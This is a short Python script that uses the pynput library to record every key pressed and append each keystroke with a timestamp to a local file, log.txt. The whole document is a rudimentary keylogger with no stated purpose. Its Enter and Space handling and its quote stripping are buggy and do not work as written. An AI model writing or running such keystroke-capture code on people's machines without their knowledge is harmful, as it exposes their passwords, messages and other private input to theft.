from pynput.keyboard import Listener
import datetime


def check_key(key):
    letter = str(key)
    letter.replace("'","")
    formated_datetime = datetime.datetime.now()

    if letter == "Key.Enter":
        letter = "\n"
    if letter == "Key.Space":
        letter = ' '


    with open("log.txt",'a') as f:
        f.write(f"{formated_datetime}: {letter}")

with Listener(on_press=check_key) as listen:
    listen.join()